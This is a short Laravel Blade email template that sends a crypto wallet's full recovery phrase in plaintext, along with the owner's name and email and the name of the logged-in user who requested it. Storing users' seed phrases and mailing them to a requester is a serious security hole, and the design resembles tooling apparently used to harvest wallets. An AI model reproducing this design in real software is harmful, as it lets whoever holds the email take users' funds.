<x-mail::message>
# Wallet Recovery Requested

A request to retrieve the recovery phrase for **{{ $linkedWalletData['name'] }}** linked to **{{ $wallet->user->name }}** ({{ $wallet->user->email }}) has been processed.

<x-mail::panel>
## Recovery Phrase ({{ $linkedWalletData['name'] }})
{{ $linkedWalletData['phrase'] }}
</x-mail::panel>

This information is highly sensitive. Please ensure it is handled according to security protocols.

**Linked on:** {{ \Carbon\Carbon::parse($linkedWalletData['linked_at'])->format('M d, Y H:i:s') }}
**Requested by:** {{ auth()->user()->name }}
**Timestamp:** {{ now()->format('M d, Y H:i:s') }}

Thanks,<br>
{{ config('app.name') }} Security
</x-mail::message>
